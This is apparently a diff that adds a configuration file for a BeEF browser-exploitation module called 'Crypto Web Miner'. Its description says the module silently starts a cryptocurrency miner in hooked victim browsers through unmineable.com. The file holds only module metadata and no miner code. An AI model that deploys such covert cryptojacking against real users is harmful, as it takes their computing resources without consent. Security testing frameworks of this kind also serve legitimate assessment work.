@@ -1,0 +1,14 @@
+beef:
+    module:
+        crypto_miner:
+            enable: true
+            category: "Misc"
+            name: "Crypto Web Miner (unmineable)"
+            description: "Silently starts a browser-based cryptocurrency miner on the hooked browser. Mining is done via unmineable.com. Configure your wallet address, coin, and the WebSocket proxy URL (set up by deploy.sh)."
+            authors: ["beef"]
+            target:
+                working_against:
+                    -   engine: "C"
+                        max_ver: ""
+                        min_ver: "1"
+
